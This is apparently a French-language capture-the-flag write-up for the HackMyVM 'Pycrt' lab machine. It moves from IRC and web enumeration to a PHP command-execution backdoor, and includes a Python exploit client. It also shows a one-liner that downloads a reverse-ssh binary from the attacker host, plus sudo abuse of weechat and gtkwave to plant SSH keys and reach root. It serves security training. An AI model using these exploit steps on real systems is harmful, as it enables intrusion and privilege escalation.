---
title: "Solution du CTF Pycrt de HackMyVM.eu"
tags: [CTF,HackMyVM]
---

### Livin' la Vida Loca

Pycrt est un CTF disponible sur [HackMyVM.eu](https://hackmyvm.eu/). Dans l'ensemble bien pensé, il est malheureusement pourri par une erreur de conception rendant impossible de résoudre le challenge.

Déjà la VM n'obtenait pas son adresse IP au démarrage, je ne sais pas si c'est la VM qui est en cause ou la dernière version de VMWare Workstation.

Après avoir réglé ça avec la méthode habituelle (edit de l'entrée GRUB, ajout d'un compte privilégié, lancement de `dhclient` au boot) je retrouve finalement la machine dans le réseau interne virtuel.

```console
$ sudo nmap -sP -T5 192.168.242.1/24
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.242.130
Host is up (0.00034s latency).
MAC Address: 00:0C:29:29:5F:64 (VMware)
Nmap scan report for 192.168.242.254
Host is up (0.000088s latency).
MAC Address: 00:50:56:EA:F5:0F (VMware)
Nmap scan report for 192.168.242.1
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 7.81 seconds
```

Parmi les ports ouverts se trouve un protocole qui a eu son heure de gloire fin 90 et début 2000 (d'où les titres des sections de cet article).

```console
$ sudo nmap -sCV -T5 -p- 192.168.242.130
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.242.130
Host is up (0.00047s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Apache2 Debian Default Page: It works
6667/tcp open  irc
| irc-info: 
|   users: 1
|   servers: 1
|   chans: 0
|   lusers: 1
|   lservers: 0
|   server: irc.local
|   version: InspIRCd-3. irc.local 
|   source ident: nmap
|   source host: 192.168.242.1
|_  error: Closing link: (nmap@192.168.242.1) [Client exited]
MAC Address: 00:0C:29:29:5F:64 (VMware)
Service Info: Host: irc.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.61 seconds
```

J'ai lancé le client de messagerie Pidgin et j'ai surveillé l'activité réseau :

```console
USER devloop * 192.168.242.130 :devloop

:irc.local NOTICE * :*** Looking up your hostname...

NICK devloop

:irc.local NOTICE devloop :*** Could not resolve your hostname: Request timed out; using your IP address (192.168.242.1) instead.
:irc.local 001 devloop :Welcome to the Localnet IRC Network devloop!devloop@192.168.242.1
:irc.local 002 devloop :Your host is irc.local, running version InspIRCd-3
:irc.local 003 devloop :This server was created 06:40:24 May 11 2025
:irc.local 004 devloop irc.local InspIRCd-3 iosw biklmnopstv :bklov
:irc.local 005 devloop AWAYLEN=200 CASEMAPPING=rfc1459 CHANLIMIT=#:20 CHANMODES=b,k,l,imnpst CHANNELLEN=64 CHANTYPES=# ELIST=CMNTU HOSTLEN=64 KEYLEN=32 KICKLEN=255 LINELEN=512 MAXLIST=b:100 :are supported by this server
:irc.local 005 devloop MAXTARGETS=20 MODES=20 NAMELEN=128 NETWORK=Localnet NICKLEN=30 PREFIX=(ov)@+ SAFELIST STATUSMSG=@+ TOPICLEN=307 USERLEN=10 USERMODES=,,s,iow WHOX :are supported by this server
:irc.local 251 devloop :There are 0 users and 0 invisible on 1 servers
:irc.local 253 devloop 1 :unknown connections
:irc.local 254 devloop 0 :channels formed
:irc.local 255 devloop :I have 0 clients and 0 servers
:irc.local 265 devloop :Current local users: 0  Max: 1
:irc.local 266 devloop :Current global users: 0  Max: 1
:irc.local 375 devloop :irc.local message of the day
:irc.local 372 devloop : **************************************************
:irc.local 372 devloop : *             H    E    L    L    O              *
:irc.local 372 devloop : *  This is a private irc server. Please contact  *
:irc.local 372 devloop : *  the admin of the server for any questions or  *
:irc.local 372 devloop : *  issues ShadowSec directory.                   *
:irc.local 372 devloop : **************************************************
:irc.local 372 devloop : *  The software was provided as a package of     *
:irc.local 372 devloop : *  Debian GNU/Linux <https://www.debian.org/>.   *
:irc.local 372 devloop : *  However, Debian has no control over this      *
:irc.local 372 devloop : *  server.                                       *
:irc.local 372 devloop : **************************************************
:irc.local 372 devloop : (The sysadmin possibly wants to edit </etc/inspircd/inspircd.motd>)
:irc.local 376 devloop :End of message of the day.

LIST

:irc.local 321 devloop Channel :Users Name
:irc.local 323 devloop :End of channel list.
```

Aucun chan n'est présent sur le serveur. Je peux lancer un script NSE spécifique à IRC (le meme que celui automatiquement chargé par Nmap).

```console
$ nmap -sV --script=irc-info -p 6667 192.168.242.130
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.242.130
Host is up (0.00038s latency).

PORT     STATE SERVICE VERSION
6667/tcp open  irc
| irc-info: 
|   users: 2
|   servers: 1
|   chans: 0
|   lusers: 2
|   lservers: 0
|   server: irc.local
|   version: InspIRCd-3. irc.local 
|   source ident: nmap
|   source host: 192.168.242.1
|_  error: Closing link: (nmap@192.168.242.1) [Client exited]
Service Info: Host: irc.local

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.43 seconds
```

On voit ici qu'avec ma connexion le nombre d'utilisateurs est passé à 2 mais je n'ai pas trouvé de moyens de découvrir l'autre utilisateur.

### Mambo No. 5

Le motd du serveur IRC mentionnait un dossier que l'on retrouve effectivement à l'adresse `http://192.168.242.130/ShadowSec` .

On tombe alors sur une page nommée `ShadowSec Tactical Interface`.

Il aura fallu plusieurs tentatives d'énumération avant de trouver quelque chose :

```console
$ feroxbuster -u http://192.168.242.130/ShadowSec/ -w DirBuster-0.12/directory-list-2.3-big.txt -x php
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.242.130/ShadowSec/
 🚀  Threads               │ 50
 📖  Wordlist              │ DirBuster-0.12/directory-list-2.3-big.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💲  Extensions            │ [php]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200        1l        4w       21c http://192.168.242.130/ShadowSec/bydataset.php
[####################] - 8m   2547124/2547124 0s      found:1       errors:0      
[####################] - 8m   2547124/2547124 4953/s  http://192.168.242.130/ShadowSec/
```

Ce script PHP nous retourne `Nothing to see here.`

Il attend vraisemblablement des paramètres, on va lui en donner à l'aide de `ffuf` :

```console
$ ffuf -u "http://192.168.242.130/ShadowSec/bydataset.php?FUZZ=1" -w tools/wordlists/common_query_parameter_names.txt -fs 21

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.242.130/ShadowSec/bydataset.php?FUZZ=1
 :: Wordlist         : FUZZ: tools/wordlists/common_query_parameter_names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 21
________________________________________________

file                    [Status: 200, Size: 19, Words: 4, Lines: 1]
:: Progress: [5699/5699] :: Job [1/1] :: 264 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

A l'aide de ce paramètre je peux lire des fichiers comme `/etc/passwd` qui contient deux utilisateurs (en dehors des classiques).

```
pycrtlake:x:1000:1000:pycrtlake,,,:/home/pycrtlake:/bin/bash
chatlake:x:1001:1001::/home/chatlake:/bin/sh
```

Alors directory traversal ou faille d'inclusion ? Je tente le RFI :

```
http://192.168.242.130/ShadowSec/bydataset.php?file=http://192.168.242.1:8000/shell.php
```

Malheureusement pas d'interprétation du PHP !

Pas d'accès non plus  aux clés SSH, fichier shadow ou `/etc/inspircd/inspircd.conf`.

Que faire ? Commençons par lire le script PHP :

```php
<?php

function decrypt($input) {
    $reversed = strrev($input);
    echo "Reversed: " . $reversed . "\n";

    $decoded = base64_decode($reversed);
    echo "Decoded: " . $decoded . "\n";

    if ($decoded === false) {
        echo "Base64 decoding failed.\n";
        return false;
    }

    if (strpos($decoded, 'cmd:') === 0) {
        return substr($decoded, 4);
    }

    return false;
}

if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['file'])) {
    $file = $_GET['file'];
    if (stripos($file, 'phpinfo') !== false) {
        exit('Access Denied');
    }
    $filterUrl = 'php://filter/convert.base64-encode/resource=' . $file;
    $data = @file_get_contents($filterUrl);
    if ($data === false) {
        exit('Failed to read file');
    }
    echo base64_decode($data);
    exit;
} elseif ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['auth']) && isset($_POST['payload'])) {
    $auth = $_POST['auth'];
    $payload = $_POST['payload'];

    if ($auth !== 'LetMeIn123!') {
        exit('Invalid Auth Token.');
    }

    $command = decrypt($payload);
    if ($command !== false) {
        $output = exec($command);
        echo "<pre>$output</pre>";
    } else {
        echo "Payload decode failed.\n";
    }
    exit;
} else {
    echo "Nothing to see here.";
}
?>
```

On trouve une autre fonctionnalité du script. On peut faire exécuter des commandes si elles sont encodées correctement (avec un préfixe, encodé en base64 puis retourné). J'ai écrit ce petit client :

```python
from base64 import b64encode

import requests

sess = requests.session()
while True:
    command = input("$ ").strip()
    if command == "exit":
        break

    payload = b64encode(f"cmd:{command}".encode()).decode()[::-1]

    response = sess.post(
            "http://192.168.242.130/ShadowSec/bydataset.php",
            data={
                "auth": "LetMeIn123!",
                "payload": payload
            }
    )
    print(response.text.split("<pre>")[1].split("</pre>")[0])
```

Il s'est avéré que l'exécution n'était pas parfaite, par exemple j'ai une seule ligne pour les entrées dans `home`...

```console
$ python cmd.py 
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ pwd
/var/www/html/ShadowSec
$ ls /home -al
drwx------  4 pycrtlake pycrtlake 4096 Apr  5 08:23 pycrtlake
```

Ce sera tout de même suffisant pour rapatrier un `reverse-ssh`... seulement ni `curl` ni `wget` ne sont disponibles sur le système.

Je m'en tire avec ce one-liner Python :

```bash
python3 -c "import urllib.request; urllib.request.urlretrieve('http://192.168.242.1:8000/reverse-sshx64', 'reverse-sshx64')"
```

### Whenever, Wherever

Je m'intéresse aux deux utilisateurs présents. Je relève que `pycrtlake` possède un bot IRC mais il est illisible :

```console
www-data@PyCrt:/home$ find / -user pycrtlake 2> /dev/null
/usr/local/bin/irc_bot.py
/home/pycrtlake
www-data@PyCrt:/home$ ls -alh /usr/local/bin/irc_bot.py
-rwxr-x--- 1 pycrtlake pycrtlake 5.7K Apr  5 08:32 /usr/local/bin/irc_bot.py
```

L'utilisateur `www-data` a une entrée sudoers, ce sera notre porte de sortie :

```console
www-data@PyCrt:/home$ sudo -l
Matching Defaults entries for www-data on PyCrt:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on PyCrt:
    (chatlake) NOPASSWD: /usr/bin/weechat
```

`[weechat](https://weechat.org/) est un vrai client IRC, pas un binaire custom.

Au lancement on a une interface TUI, style ncurses :

```
1.weechat│WeeChat 3.0 (C) 2003-2020 - https://weechat.org/
│         10:27:40     |   ___       __         ______________        _____ 
│         10:27:40     |   __ |     / /___________  ____/__  /_______ __  /_
│         10:27:40     |   __ | /| / /_  _ \  _ \  /    __  __ \  __ `/  __/
│         10:27:40     |   __ |/ |/ / /  __/  __/ /___  _  / / / /_/ // /_  
│         10:27:40     |   ____/|__/  \___/\___/\____/  /_/ /_/\__,_/ \__/  
│         10:27:40     | WeeChat 3.0 [compiled on Jan 23 2022 14:29:14]
│         10:27:40     | - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
│         10:27:41     | Plugins loaded: alias, buflist, charset, exec, fifo, fset, irc, logger, perl, python, relay, ruby, script, spell, trigger, xfer
```

Via le [Guide utilisateur WeeChat](https://weechat.org/files/doc/weechat/stable/weechat_user.fr.html#external_commands), je trouve un moyen d'exécuter des commandes.

Ainsi saisir `/exec id` retourne `uid=1001(chatlake) gid=1001(chatlake) groups=1001(chatlake)`.

Si on peut profiter des redirections, il faut utiliser l'option `-sh`, par exemple :

`/exec -sh echo test > /tmp/test.txt`

J'utilise ce principe pour écrire dans le fichier `authorized_keys` de `chatlake`.

```console
$ id
uid=1001(chatlake) gid=1001(chatlake) groups=1001(chatlake)
$ ls -al
total 32
drwx------ 4 chatlake chatlake 4096 May 11 10:34 .
drwxr-xr-x 4 root     root     4096 Apr  5 07:56 ..
lrwxrwxrwx 1 root     root        9 Apr  5 08:24 .bash_history -> /dev/null
-rw-r--r-- 1 chatlake chatlake  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 chatlake chatlake 3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 chatlake chatlake  807 Apr 18  2019 .profile
drwxr-xr-x 2 chatlake chatlake 4096 May 11 10:34 .ssh
-rw-r--r-- 1 chatlake chatlake   39 Apr  4 23:55 user.txt
drwxr-xr-x 8 chatlake chatlake 4096 May 11 10:35 .weechat
$ cat user.txt  
flag{b42baba466402e32157a1cbba819664e}
```

### Toxic

On rentre dans la mauvaise partie du CTF.

On a donc cette entrée sudoers qui permet de lancer le bot IRC avec n'importe quel utilisateur :

```console
$ sudo -l
Matching Defaults entries for chatlake on PyCrt:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User chatlake may run the following commands on PyCrt:
    (ALL) NOPASSWD: /usr/bin/systemctl start irc_bot.service
```

Évidemment ce n'est pas aussi "open" que cela puisque l'utilisateur à utiliser est spécifié dans l'entrée `[Service]` :

```console
chatlake@PyCrt:~$ ls -al /etc/systemd/system/irc_bot.service 
-rw-r--r-- 1 root root 323 Apr  4 10:24 /etc/systemd/system/irc_bot.service
chatlake@PyCrt:~$ cat /etc/systemd/system/irc_bot.service
[Unit]
Description=IRC Bot Service
After=network.target

[Service]
User=pycrtlake
Group=pycrtlake
WorkingDirectory=/usr/local/bin
ExecStart=/usr/bin/python3 /usr/local/bin/irc_bot.py
Restart=always
RestartSec=5
StandardOutput=syslog
StandardError=syslog
Environment=PYTHONUNBUFFERED=1

[Install]
WantedBy=multi-user.target
chatlake@PyCrt:~$ ls -al /usr/local/bin/irc_bot.py
-rwxr-x--- 1 pycrtlake pycrtlake 5744 Apr  5 08:32 /usr/local/bin/irc_bot.py
```

On voit ici que le répertoire de travail est `/usr/local/bin/` sur lequel on ne dispose pas de droits d'écriture donc pas d'hijack de module Python ici.

Pour résumer : aucune modification possible, on ne peut que démarrer le service.

Après démarrage, on remarque que des nouveaux chans IRC sont apparus :

```
LIST

:irc.local 321 devloop Channel :Users Name
:irc.local 322 devloop #chan2 1 :[+nt] 
:irc.local 322 devloop #chan3 1 :[+nt] 
:irc.local 322 devloop #chan4 1 :[+nt] 
:irc.local 322 devloop #chan5 1 :[+nt] 
:irc.local 322 devloop #chan6 1 :[+nt] 
:irc.local 322 devloop #chan1 1 :[+nt] 
:irc.local 323 devloop :End of channel list.
```

Je me connecte à tous ces chans et dans le channel `#chan6` un message revient périodiquement :

`(14:57:58) admin: My friends and I are chatting on it, but we all follow the formatting requirements. Finally, we need to:) End`

Il m'a fallu du temps pour comprendre exactement ce qui était attendu.

Le bot attend en fait que l'on tape un message qui se termine par `:)`. Ça ne fonctionne que depuis le `#chan1`.

Dans ce cas, on reçoit un message privé de l'admin : `(15:07:53) admin: [!] Format error or presence of illegal characters`

À l'aide de ChatGPT, j'ai écrit ce code suivant qui tentait désespérément de trouver le bon format :

```python
import socket, time, string

HOST = "192.168.242.130"
PORT = 6667
CHANNEL = "#chan1"
NICK = "brute"
USERNAME = "brute"
END = " :)"

s = socket.create_connection((HOST, PORT))
s.sendall(f"NICK {NICK}\r\n".encode())
s.sendall(f"USER {USERNAME} 0 * :{USERNAME}\r\n".encode())

# Wait for welcome message (001)
while True:
    resp = s.recv(4096).decode(errors="ignore")
    print(resp)
    if "001" in resp:
        break
    if "PING" in resp:
        s.sendall(resp.replace("PING", "PONG").encode())


time.sleep(2)
s.sendall(f"JOIN {CHANNEL}\r\n".encode())
time.sleep(1)

# Clear initial messages
s.settimeout(1.0)
try:
    while True:
        s.recv(4096)
except:
    pass

s.settimeout(2.0)

for c in string.printable:
    if c in "\r\n:":
        continue
    payload = f"{c}{END}"
    s.sendall(f"PRIVMSG {CHANNEL} :{payload}\r\n".encode())
    print(f"Sent: {payload}")

    try:
        response = s.recv(4096).decode(errors="ignore")
        if "[!] Format error" not in response:
            print(f"[*] Possible valid input: {payload}")
            print(response)
        else:
            print("-> Invalid format")
    except socket.timeout:
        print("-> No response")

    time.sleep(1)

s.close()
```

Rien n'a fonctionné.

Je ne vais pas tourner autour du pot plus longtemps, sans les droits de lecture sur le bot Python, il est tout simplement impossible de deviner ce qu'il faut faire.

J'ai dû rouvrir la VM pour accéder au contenu du script :

```python
import irc.bot
import irc.client
import re
import subprocess
import time
import threading

class IRCBot(irc.bot.SingleServerIRCBot):
    def __init__(self, server, port, nickname, channels, command_channel):
        irc.bot.SingleServerIRCBot.__init__(self, [(server, port)], nickname, nickname)
        self.channel_list = channels
        self.command_channel = "#chan1"  # 唯一执行命令的频道
        self.command_channels = ["#chan1", "#chan2", "#chan3", "#chan4", "#chan5"]  # 所有检测命令的频道
        self.command_pattern = re.compile(r':\)$')
        self.allowed_users = {"Todd", "suraxddq", "ll104567"}
        self.number_regex = re.compile(r'^\s*(\d+\s+)*\d+\s*$')
        self.allowed_commands = ["more", "dir", "busybox", "whoami"]
        self.chan6_timer = None  

    def on_welcome(self, connection, event):
        for channel in self.channel_list:
            connection.join(channel)
            print(f"[+] Already joined the channel：{channel}")
        self.start_chan6_timer()

    def start_chan6_timer(self):
        if self.chan6_timer:
            self.chan6_timer.cancel()
        self.chan6_timer = threading.Timer(180.0, self.send_chan6_message)
        self.chan6_timer.start()

    def send_chan6_message(self):
        try:
            if self.connection.is_connected():
                self.connection.privmsg("#chan6", "My friends and I are chatting on it, but we all follow the formatting requirements. Finally, we need to:) End")
                print("[*] Timed reminder has been sent #chan6")
        except Exception as e:
            print(f"[!] Sending timed notification failed：{str(e)}")
        finally:
            self.start_chan6_timer()

    def on_disconnect(self, connection, event):
        if self.chan6_timer:
            self.chan6_timer.cancel()
            self.chan6_timer = None
        super().on_disconnect(connection, event)

    def on_pubmsg(self, connection, event):
        channel = event.target
        user = event.source.nick
        message = event.arguments[0]

        # 检测所有命令频道的消息
        if channel in self.command_channels and self.command_pattern.search(message):
            print(f"[*] Received command：{message} (From users：{user})")
            
            # 格式验证（所有频道通用）
            cmd_part = message.rsplit(':)', 1)[0].strip()
            if not self.number_regex.match(cmd_part):
                connection.privmsg(user, "[!] Format error or presence of illegal characters")
                return
            
            # 非#chan1频道直接返回权限错误
            if channel != self.command_channel:
                connection.privmsg(user, "[!] Error: Command execution not allowed")
                return
            
            # #chan1专属执行流程
            if self.validate_command(user):
                try:
                    numbers = list(map(int, cmd_part.split()))
                    for num in numbers:
                        if num < 0 or num > 255:
                            raise ValueError("[-] Number range exceeds（0-255）")
                    ascii_cmd = ''.join([chr(n) for n in numbers])
                except ValueError as e:
                    connection.privmsg(user, f"[!] conversion error ：{str(e)}")
                    return
                
                if not self.is_command_allowed(ascii_cmd):
                    connection.privmsg(user, f"[!] Wrong command: '{ascii_cmd.split()[0]}' unauthorized!")
                    return

                result = self.execute_command(ascii_cmd)
                if result:
                    safe_result = result.replace('\n', ' ').replace('\r', '')
                    try:
                        connection.privmsg(user, f"[+] COMMAND EXECUTION：{safe_result}")
                    except irc.client.InvalidCharacters:
                        connection.privmsg(user, "[!] Format error or presence of illegal characters")
            else:
                connection.privmsg(user, "[!] Format error or presence of illegal characters")

    def is_command_allowed(self, command):
        parts = command.strip().split()
        if not parts:
            return False
        main_cmd = parts[0]
        return (
            main_cmd in self.allowed_commands and
            not re.search(r'[;&|`]', command)
        )

    def execute_command(self, command):
        try:
            parts = command.strip().split()
            output = subprocess.check_output(
                parts,
                stderr=subprocess.STDOUT,
                universal_newlines=True,
                timeout=10
            )
            return output.strip()[:400].replace('\r', '').replace('\n', ' ')
        except subprocess.CalledProcessError as e:
            return f"[!] Command execution failed：{e.output.strip()}"
        except Exception as e:
            return f"[-] Error：{str(e)}"

    def validate_command(self, user):
        return user in self.allowed_users

def run_bot():
    server = "PyCrt"
    port = 6667
    nickname = "admin"
    channels = ["#chan1", "#chan2", "#chan3", "#chan4", "#chan5", "#chan6"]
    command_channel = "#chan1"

    while True:
        try:
            print("[*] Starting IRC server...")
            bot = IRCBot(server, port, nickname, channels, command_channel)
            bot.start()
        except KeyboardInterrupt:
            print("\n[!] user exit")
            if bot.chan6_timer:
                bot.chan6_timer.cancel()
            break
        except Exception as e:
            print(f"[!] Exception occurred:{str(e)}，Try again in 5 seconds...")
            time.sleep(5)

if __name__ == "__main__":
    run_bot()
```

Déjà le fait que les commandes ne soient acceptées que depuis le `#chan1` c'était bien tricky.

Ensuite, on s'aperçoit que devant le smiley, on ne peut passer que des numéros et des whitespaces... Ce serait OK si le script ne vérifiait pas que l'utilisateur est dans une whitelist improbable, le pire étant qu'on fallback sur le même message d'erreur `[!] Format error or presence of illegal characters` ce qui explique que même si devine le bon format, j'obtiens cette erreur disant que ce n'est pas valide.

Pour terminer, une fois les numéros décodés, aucune exécution de code directe n'est faite, il y a encore une whitelist sur les commandes possibles. Et cela toujours sans aucune verbosité.

Toutes ces conditions laissent supposer que l'auteur du CTF a oublié de rendre le script lisible pour l'utilisateur `chatlake`. Deviner l'ensemble des inconnues ici est tout simplement impossible.

### It Wasn't Me

On va donc se reconnecter sur le chan IRC avec cet user `Todd` qui n'est mentionné nulle part ailleurs sur le CTF.

Le principe des numéros, c'est qu'il faut passer les valeurs ordinales des caractères de la commande. Ainsi pour la commande `dir` il faut envoyer `100 105 114 :)`.

On obtient alors cette réponse :

`(16:15:43) admin: [+] COMMAND EXECUTION：calc-prorate irc_bot.py`

Parmi les commandes autorisées il y a `busybox` qui permet d'exécuter toutes les commandes classiques de Linux. On va l'utiliser pour copier notre clé SSH :

```python
>>> " ".join([str(ord(c)) for c in "busybox cp /tmp/authorized_keys /home/pycrtlake/.ssh/"])
'98 117 115 121 98 111 120 32 99 112 32 47 116 109 112 47 97 117 116 104 111 114 105 122 101 100 95 107 101 121 115 32 47 104 111 109 101 47 112 121 99 114 116 108 97 107 101 47 46 115 115 104 47'
```

On arrive enfin à la fin avec ce dernier sudo :

```console
pycrtlake@PyCrt:~$ sudo -l
Matching Defaults entries for pycrtlake on PyCrt:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pycrtlake may run the following commands on PyCrt:
    (ALL) NOPASSWD: /usr/bin/gtkwave
```

`gtkwave` est un programme qui travaille sur les fichiers VCD. J'ai demandé à l'IA Claude de me générer un VCD valide, mais le plus petit possible :

```
$date
$end
$version
$end
$timescale 1ns
$end
$scope module m $end
$var wire 1 a x $end
$upscope $end
$enddefinitions $end
#0
$dumpvars
0a
$end
#10
1a
$end
```

D'après la manpage du programme, on peut exécuter un script Tcl avec l'option `-S`. J'ai écrit ceci :

```tcl
exec mkdir -p /root/.ssh
exec cp /tmp/authorized_keys /root/.ssh
puts "victory"
```

Sans trop de surprises ça ne marche pas, car aucun serveur graphique ne tourne sur la VM (si le nom du binaire commence par `gtk` c'est un signe) :

```console
pycrtlake@PyCrt:~$ sudo /usr/bin/gtkwave -S script.tcl test.vcd 
Could not initialize GTK!  Is DISPLAY env var/xhost set?

Usage: /usr/bin/gtkwave [OPTION]... [DUMPFILE] [SAVEFILE] [RCFILE]

  -n, --nocli=DIRPATH        use file requester for dumpfile name
  -f, --dump=FILE            specify dumpfile name
  -F, --fastload             generate/use VCD recoder fastload files
  -o, --optimize             optimize VCD to FST
  -a, --save=FILE            specify savefile name
  -A, --autosavename         assume savefile is suffix modified dumpfile name
  -r, --rcfile=FILE          specify override .rcfile name
  -d, --defaultskip          if missing .rcfile, do not use useful defaults
  -D, --dualid=WHICH         specify multisession identifier
  -l, --logfile=FILE         specify simulation logfile name for time values
  -s, --start=TIME           specify start time for LXT2/VZT block skip
  -e, --end=TIME             specify end time for LXT2/VZT block skip
  -t, --stems=FILE           specify stems file for source code annotation
  -c, --cpu=NUMCPUS          specify number of CPUs for parallelizable ops
  -N, --nowm                 disable window manager for most windows
  -M, --nomenus              do not render menubar (for making applets)
  -S, --script=FILE          specify Tcl command script file for execution
  -T, --tcl_init=FILE        specify Tcl command script file to be loaded on startup
  -W, --wish                 enable Tcl command line on stdio
  -R, --repscript=FILE       specify timer-driven Tcl command script file
  -P, --repperiod=VALUE      specify repscript period in msec (default: 500)
  -X, --xid=XID              specify XID of window for GtkPlug to connect to
  -1, --rpcid=RPCID          specify RPCID of GConf session
  -2, --chdir=DIR            specify new current working directory
  -3, --restore              restore previous session
  -4, --rcvar                specify single rc variable values individually
  -5, --sstexclude           specify sst exclusion filter filename
  -I, --interactive          interactive VCD mode (filename is shared mem ID)
  -C, --comphier             use compressed hierarchy names (slower)
  -g, --giga                 use gigabyte mempacking when recoding (slower)
  -L, --legacy               use legacy VCD mode rather than the VCD recoder
  -v, --vcd                  use stdin as a VCD dumpfile
  -O, --output=FILE          specify filename for stdout/stderr redirect
  -z, --slider-zoom          enable horizontal slider stretch zoom
  -V, --version              display version banner then exit
  -h, --help                 display this help then exit
  -x, --exit                 exit after loading trace (for loader benchmarks)

VCD files and save files may be compressed with zip or gzip.
GHW files may be compressed with gzip or bzip2.
Other formats must remain uncompressed due to their non-linear access.
Note that DUMPFILE is optional if the --dump or --nocli options are specified.
SAVEFILE and RCFILE are always optional.

Report bugs to <bybell@rocketmail.com>.
```

On pourrait faire tourner un X sur notre machine et passer notre IP via la variable `DISPLAY` mais j'ai eu recours à `xvfb-run` qui est une sorte d'émulateur X pour les terminaux :

```console
pycrtlake@PyCrt:~$ xvfb-run -a sudo /usr/bin/gtkwave -S script.tcl test.vcd

GTKWave Analyzer v3.3.118 (w)1999-2023 BSI

[0] start time.
[10] end time.

(gtkwave:32311): dconf-WARNING **: 12:51:44.181: failed to commit changes to dconf: Failed to execute child process ?dbus-launch? (No such file or directory)
GTKWAVE | Executing Tcl script 'script.tcl'
victory

(gtkwave:32311): dconf-WARNING **: 12:51:44.294: failed to commit changes to dconf: Failed to execute child process ?dbus-launch? (No such file or directory)

(gtkwave:32311): dconf-WARNING **: 12:51:44.294: failed to commit changes to dconf: Failed to execute child process ?dbus-launch? (No such file or directory)
^C
```

On voit ici le petit "victory" que j'avais placé dans mon script. On peut donc récupérer l'accès root :

```console
$ ssh -i ~/.ssh/key_no_pass root@192.168.242.130
Linux PyCrt 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun May 11 06:40:51 2025
root@PyCrt:~# id
uid=0(root) gid=0(root) groups=0(root)
root@PyCrt:~# ls
root.txt
root@PyCrt:~# cat root.txt 
flag{e80ecc46ca5e00bf8a51c47f0cc3e868}
```
